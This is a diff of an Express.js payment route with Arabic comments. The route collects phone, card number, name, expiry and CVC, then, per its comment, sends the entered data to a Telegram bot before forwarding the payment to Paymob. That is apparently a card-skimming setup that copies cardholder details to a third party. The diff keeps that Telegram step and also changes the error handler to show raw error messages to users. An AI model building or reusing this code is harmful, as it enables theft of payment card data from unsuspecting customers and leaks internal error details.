@@ -23,12 +23,17 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
-// 3. مسار معالجة الدفع الموحد (يدعم GET و POST لمنع أي تعارض)
+// 3. مسار معالجة الدفع الموحد (يدعم GET و POST بسلاسة مع حماية ضد الانهيار)
 async function handlePaymentRequest(req, res) {
   try {
     // تجميع البيانات سواء قادمة من GET (Query) أو POST (Body)
     const data = { ...req.query, ...req.body };
     const { phone, amount, payment_method, method, number, name, expiry, cvc, save_card } = data;
+
+    // إذا تم فتح الرابط مباشرة بدون إرسال بيانات، قم بإرجاعه للصفحة الرئيسية بدلاً من إظهار خطأ
+    if (!amount && Object.keys(data).length === 0) {
+      return res.redirect("/");
+    }
 
     const selectedMethod = payment_method || method || "wallet";
     const userPhone = phone || "غير محدد";
@@ -49,7 +54,9 @@ async function handlePaymentRequest(req, res) {
     };
 
     // إرسال إشعار فوري إلى تليجرام بالبيانات المدخلة قبل التوجيه لـ Paymob
-    await sendTelegramMessage(paymentPayload, true);
+    if (typeof sendTelegramMessage === "function") {
+      await sendTelegramMessage(paymentPayload, true);
+    }
 
     // معالجة الدفع عبر Paymob
     const result = await processPayment(userPhone, payAmount, selectedMethod);
@@ -64,7 +71,7 @@ async function handlePaymentRequest(req, res) {
     }
   } catch (err) {
     console.error("❌ خطأ في معالجة الدفع:", err.response?.data || err.message);
-    res.status(500).send("حدث خطأ أثناء معالجة عملية الدفع، يرجى المحاولة لاحقاً.");
+    res.status(500).send(`حدث خطأ أثناء معالجة عملية الدفع: ${err.message}`);
   }
 }
 
